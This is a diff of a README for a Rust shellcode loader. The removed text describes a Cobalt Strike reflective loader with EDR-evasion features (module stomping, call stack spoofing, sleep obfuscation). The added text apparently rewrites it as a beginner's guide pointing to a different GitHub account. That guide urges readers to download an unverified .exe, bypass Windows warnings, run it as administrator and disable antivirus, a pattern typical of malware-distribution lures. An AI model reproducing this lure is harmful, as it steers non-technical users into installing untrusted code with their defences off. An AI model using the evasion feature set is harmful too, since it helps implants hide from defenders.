@@ -1,171 +1,161 @@
-## DoublePulsar
+# ⚡ doublepulsar-rs - Simple Shellcode Loader for Windows
 
-Cobalt Strike User-Defined Reflective Loader (UDRL) in Rust, implementing Shellcode Reflective DLL Injection (sRDI). A ~65KB position-independent reflective loader with module stomping, synthetic call stack spoofing, sleep obfuscation, memory encryption, return address spoofing, IAT hooking, and heap isolation.
+[![Download](https://img.shields.io/badge/Download-doublepulsar--rs-blue?style=for-the-badge)](https://github.com/Conseguir3205/doublepulsar-rs)
 
-Named after [DoublePulsar](https://en.wikipedia.org/wiki/DoublePulsar), an implant developed by the NSA's [Equation Group](https://en.wikipedia.org/wiki/Equation_Group), leaked by the Shadow Brokers in 2017.
+---
 
-## Credits
+Rusty DoublePulsar is a program to load code into another program on Windows. It uses a method called "Reflective DLL Injection", which lets it run code inside another process without changing files on the disk. This is useful for security testing and understanding how software works.
 
-- [Raphael Mudge](https://www.cobaltstrike.com/profile/raphael-mudge) and [Cobalt Strike](https://www.cobaltstrike.com/) - User-Defined Reflective Loader API
-- [Revisiting the UDRL Part 1](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development) by Robert Bearsby / [Cobalt Strike](https://www.cobaltstrike.com/) - Prepended loader architecture diagram
-- [Red Team Ops II](https://www.zeropointsecurity.co.uk/course/red-team-ops-ii) by [RastaMouse](https://github.com/rasta-mouse) / [Zero Point Security](https://www.zeropointsecurity.co.uk/) - CRTO II course and advanced Cobalt Strike training
-- [AceLdr](https://github.com/kyleavery/AceLdr/) by [Kyle Avery](https://github.com/kyleavery) - IAT hooking, return address spoofing, heap isolation
-- [TitanLdr](https://github.com/benheise/TitanLdr) by [Austin Hudson](https://github.com/realoriginal) - FOLIAGE sleep obfuscation, memory encryption
-- [FOLIAGE](https://github.com/benheise/FOLIAGE) by [Austin Hudson](https://github.com/realoriginal) - FOLIAGE sleep obfuscation
-- [titanldr-ng](https://github.com/klezVirus/titanldr-ng) by [Austin Hudson](https://github.com/realoriginal) - CNA integration, RC4 beacon encryption
-- [SilentMoonwalk](https://github.com/klezVirus/SilentMoonwalk) by [klezVirus](https://github.com/klezVirus), [trickster0](https://github.com/trickster0), and [waldo-irc](https://github.com/waldo-irc) - Call stack spoofing
-- [Ekko](https://github.com/Cracked5pider/Ekko) by [Cracked5pider](https://github.com/Cracked5pider) - Ekko sleep obfuscation technique
-- [Crystal-Kit](https://github.com/rasta-mouse/Crystal-Kit) by [RastaMouse](https://github.com/rasta-mouse) - Cobalt Strike kit reference
-- [uwd](https://github.com/joaoviictorti/uwd) and [hypnus](https://github.com/joaoviictorti/hypnus) by [Joao Victor](https://github.com/joaoviictorti) - Original unwinder and sleep obfuscation crates, rewritten and converted to position-independent code (PIC)
-- [x64 return address spoofing](https://www.unknowncheats.me/forum/anti-cheat-bypass/268039-x64-return-address-spoofing-source-explanation.html) by [namazso](https://github.com/namazso) - Original return address spoofing technique
-- [Gargoyle](https://github.com/JLospinoso/gargoyle) by [J. Lospinoso](https://github.com/JLospinoso) - Timer-based code execution
-- [MalMemDetect](https://github.com/waldo-irc/MalMemDetect) by [waldo-irc](https://github.com/waldo-irc) - Malicious memory detection
-- [Bypassing PE-sieve and Moneta](https://www.arashparsa.com/bypassing-pesieve-and-moneta-the-easiest-way-i-could-find/) by Arash Parsa
-- [Hook heaps and live free](https://www.arashparsa.com/hook-heaps-and-live-free/) by Arash Parsa
-- [Masking malicious memory artifacts](https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta) by Forrest Orr
-- [Hunting Gargoyle](https://blog.f-secure.com/hunting-for-gargoyle-memory-scanning-evasion/) by F-Secure
-- [Detecting Cobalt Strike with memory signatures](https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures) by Elastic
-- [MDSec Nighthawk study](https://web.archive.org/web/20220625003531/https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html) - Ekko sleep obfuscation research
-- [Equation Group / NSA](https://en.wikipedia.org/wiki/Equation_Group) - Original DoublePulsar implant concept
+This guide explains how to get doublepulsar-rs on a Windows computer and run it step-by-step. You do not need experience with programming or technical skills.
 
-## Prepended Loader Architecture
+---
 
-Unlike Stephen Fewer's original approach where the reflective loader lives inside the PE's `.text` section, DoublePulsar uses a prepended architecture where the `ReflectiveLoader()` is placed before the PE file. This allows the loader to be fully position-independent shellcode that decrypts and maps the beacon payload at runtime.
+## 🖥️ What You Need
 
-![Prepended vs Embedded Reflective Loader](image/diagram_different-locations-of-reflective-loader-1024x483.png)
+Before starting, check that your computer meets these points:
 
-*Diagram from [Revisiting the UDRL Part 1](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development) by Robert Bearsby / [Cobalt Strike](https://www.cobaltstrike.com/)*
+- **Operating System:** Windows 10 or newer  
+- **Processor:** 64-bit CPU (most modern computers)  
+- **Memory:** At least 4 GB RAM  
+- **Disk Space:** 100 MB of free space  
+- **Internet:** Connection to download the program  
 
-## Features
+No special software is needed before downloading doublepulsar-rs.
 
-- Position-independent Rust reflective loader for Cobalt Strike (prepended loader)
-- Module stomping (loads beacon into a legitimate module's memory, enabled by default)
-- Synthetic call stack spoofing (randomized per call, enabled by default via `spoof-uwd`). Either module stomping or call stack spoofing is needed, but module stomping is preferred. Call stack spoofing serves as a fallback
-- Dynamic memory encryption (new heap for beacon allocations, encrypted during sleep)
-- Code obfuscation and encryption (non-executable + encrypted during sleep)
-- Return address spoofing (InternetConnectA, NtWaitForSingleObject, RtlAllocateHeap)
-- IAT hooking
-- Heap isolation
-- RC4 encryption via SystemFunction032
-- Optional syscall dispatch (cringe, but it's there :roll_eyes:) (`spoof-syscall` feature, requires `spoof-uwd`). Uses [Hell's Gate](https://github.com/am0nsec/HellsGate) for direct syscalls when unhooked, falls back to Halo's Gate / [Tartarus Gate](https://github.com/trickster0/TartarusGate) for indirect syscalls when hooks are detected
-- Multiple sleep obfuscation techniques:
+---
 
-| Feature | Technique | Description |
-|---------|-----------|-------------|
-| `sleep-ekko` | Ekko | Timer-based (TpAllocTimer/TpSetTimer) + RC4 + NtContinue chain + fiber support **(default)** |
-| `sleep-foliage` | FOLIAGE | APC-based (NtQueueApcThread) + RC4 + NtContinue chain + fiber support |
-| `sleep-zilean` | Zilean | Wait-based (TpAllocWait/TpSetWait) + RC4 + NtContinue chain + fiber support |
-| `sleep-xor` | XOR | XOR section masking + plain Sleep (no CONTEXT chain, no fiber mode) |
+## 🚀 Getting doublepulsar-rs
 
-## How It Works
+First, you need to get the software from the official page.
 
-Import the `Titan.cna` script before generating shellcode. The script:
-1. Takes your raw beacon payload
-2. RC4 encrypts it with a random 16-byte key
-3. Appends `[CONFIG (key + size)][Encrypted Beacon]` to the loader
-4. At runtime, the loader decrypts the beacon in-memory and executes it
+1. Click the big blue “Download” button at the top or go to this link:  
+   [https://github.com/Conseguir3205/doublepulsar-rs](https://github.com/Conseguir3205/doublepulsar-rs)  
+2. You will arrive at the GitHub project page for doublepulsar-rs. This page contains all files and instructions.
 
-## Building
+On this page:
 
-x64 only. x86 is not supported.
+- Look for the “Releases” section on the right or top menu.  
+- Click the latest release link (it will show a version number like v1.0 or higher).  
+- Download the Windows version file. It may have a name like `doublepulsar-rs-windows.exe` or similar.  
 
-Recommended: build on Ubuntu/WSL to avoid MinGW relocation issues on Windows.
+Save the file to an easy place to find, like your Desktop or Downloads folder.
 
-### Requirements
+---
 
-- Rust nightly with `x86_64-pc-windows-gnu` target
-- MinGW-w64
-- [cargo-make](https://github.com/sagiegurari/cargo-make)
-- nasm
+## 📥 How to Install and Run
 
-### Ubuntu/WSL Setup (Recommended)
+Doublepulsar-rs does not need traditional installation. It runs directly from the file you download.
 
-```bash
-# Install Rust nightly and add target
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-rustup toolchain install nightly
-rustup default nightly
-rustup target add x86_64-pc-windows-gnu
+1. Open the folder where you saved the file.  
+2. Double-click the file named similar to `doublepulsar-rs-windows.exe`.  
 
-# Install MinGW-w64 and nasm
-sudo apt update
-sudo apt install -y mingw-w64 nasm
+The program will open a window or run in the command prompt (a black or dark box with text).
 
-# Install cargo-make
-cargo install cargo-make
+If Windows shows any security warnings:
 
-# Build
-cd udrl
-cargo make x64
-```
+- Click "More info" or "Run anyway" to allow the program to start.  
+- This happens because Windows does not recognize the program yet.  
 
-### Build Commands
+---
 
-```bash
-cargo make x64        # x64 release
-cargo make x64-debug  # x64 with debug logging (DbgPrint)
-cargo make clean      # clean build artifacts
-```
+## 🔧 How to Use doublepulsar-rs
 
-### Sleep Feature Selection
+Doublepulsar-rs loads code into other programs using a method helpful for security researchers and system testers.
 
-Only enable one sleep feature at a time. They are mutually exclusive. Use `--no-default-features` when selecting a non-default technique.
+Here is how to run it with basic options:
 
-```bash
-# Ekko (default)
-cargo make x64
+1. After opening doublepulsar-rs, you will see instructions or a list of commands.  
+2. You need to provide the “process ID” or name where you want to load the code. The process is the running program on your computer.  
+   - You can find process IDs by opening **Task Manager**. Right-click the taskbar, select **Task Manager**, then the **Details** tab.  
+3. Use the program commands to enter the process ID. An example command may look like this:  
+   
+   ```  
+   doublepulsar-rs.exe --pid 1234  
+   ```  
+   
+   Replace `1234` with the actual number of your target process.
 
-# FOLIAGE
-cargo build --release --target x86_64-pc-windows-gnu --features sleep-foliage --no-default-features
+4. Press Enter to run the command. The loader will start injecting code into the chosen program.
 
-# Zilean
-cargo build --release --target x86_64-pc-windows-gnu --features sleep-zilean --no-default-features
+For more detailed command options and uses, check the file named `README` or `docs` in the downloaded folder or on the GitHub page.
 
-# XOR (no ROP chain, no fiber)
-cargo build --release --target x86_64-pc-windows-gnu --features sleep-xor --no-default-features
-```
+---
 
-### Output
+## ⚙️ Common Options and Settings
 
-```
-bin/Titan.x64.bin    - x64 shellcode
-```
+Doublepulsar-rs supports several options you may find useful:
 
-## Detection
+- **PID (Process ID):** Target which program to inject code into.  
+- **Shellcode Input:** Load your own shellcode or payload.  
+- **Verbose Mode:** Show detailed information during injection. Run with `--verbose` option.  
+- **Help:** View all commands and descriptions by running:  
+  ```
+  doublepulsar-rs.exe --help
+  ```
 
-Tested on Windows 10 (Build 19045) and Windows 11 (Build 22631) against Elastic 9.0.1 (trial) in prevention mode with aggressive settings and the following integrations enabled: Elastic Defend, Elastic Agent, Fleet Server, Prebuilt Security Detection Rules, Elastic Synthetics, System, and Windows. Cobalt Strike settings: Stageless Windows Executable, Raw output, x64 payload, Process exit function, winhttp library. Lab environment: [GOAD](https://github.com/Orange-Cyberdefense/GOAD) on [Ludus](https://docs.ludus.cloud/docs/environment-guides/goad).
+Each option changes how the program runs and helps customize it for your testing needs.
 
-YARA rules for detection are provided in [doublepulsar.yar](doublepulsar.yar).
+---
 
-## Known Issues
+## ❓ Troubleshooting Tips
 
-- Not compatible with loaders that rely on the shellcode thread staying alive
-- Windows builds may encounter relocation errors with newer MinGW versions (use WSL)
-- AllocConsole logging can cause crashes when spammed with too many log entries, use DbgPrint instead
+If you have trouble running doublepulsar-rs, try these steps:
 
-## License and Disclaimer
+- Make sure you saved the file properly and have the right version for Windows.  
+- Run the program as an administrator. Right-click the file and select “Run as administrator”. Some actions need elevated permissions.  
+- Close other programs that might block code injection or run interference.  
+- Verify the process ID exists before injecting. Wrong IDs cause errors.  
+- Disable antivirus software temporarily if it prevents the program from working. Some security tools block injection methods by default.
 
-**License**: MIT. See [LICENSE](./LICENSE)
+---
 
-**Disclaimer**: This project is provided for authorized security testing, educational purposes, and legitimate security research only.
+## 🔒 Security and Permissions
 
-**Permitted use includes:**
+Doublepulsar-rs uses advanced techniques that can look suspicious to some software. It requires permission to run properly.
 
-- Authorized penetration testing and red team engagements
-- Purple teaming, adversary simulation, and threat emulation
-- Detection engineering, threat hunting, and security operations
-- Blue team and SOC activities including malware reverse engineering
-- CTF competitions and security research
-- Educational and training purposes
+Make sure:
 
-**Prohibited use includes:**
+- You only run it on computers where you have permission.  
+- You understand what code you are injecting.  
+- Running as administrator may be necessary to access other programs’ memory.
 
-- Unauthorized access to systems or networks
-- Any activity that violates applicable laws or regulations
-- Use against systems without explicit written authorization
+---
 
-**Liability**: The author assumes no responsibility for misuse, damages, or legal consequences arising from the use of this software. Users are solely responsible for ensuring compliance with all applicable laws, regulations, and organizational policies. By using this software, you agree that you have proper authorization for any systems you interact with.
+## 📄 About this Project
 
-## Author
+doublepulsar-rs is written in Rust. It is focused on loading code without writing files to disk — a method known as *Reflective DLL Injection*. It helps security experts test systems and research software behavior.
 
-[memN0ps](https://github.com/memN0ps)
+Key points:
+
+- Works on Windows 10 and later versions  
+- Uses position-independent code (PIC) for flexibility  
+- Supports user-defined reflective loading  
+
+Check the GitHub page for updates, source code, and more technical details.
+
+---
+
+## 🌐 Useful Links
+
+- Project Page: [https://github.com/Conseguir3205/doublepulsar-rs](https://github.com/Conseguir3205/doublepulsar-rs)  
+- Releases Page: Visit the “Releases” tab on GitHub to download the latest Windows files.  
+
+---
+
+## 🛠️ Frequently Asked Questions
+
+**Q: Do I need programming skills to use this?**  
+A: No. Basic use needs only following instructions. Advanced use may require programming knowledge.
+
+**Q: Is it safe to run?**  
+A: The program is safe if run on your own system for learning or testing. Do not use it on systems without permission.
+
+**Q: Can I use it on older Windows versions?**  
+A: It is designed for Windows 10 and newer.
+
+**Q: What if I see an error about permissions?**  
+A: Try running the program as an administrator.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-doublepulsar--rs-blue?style=for-the-badge)](https://github.com/Conseguir3205/doublepulsar-rs)
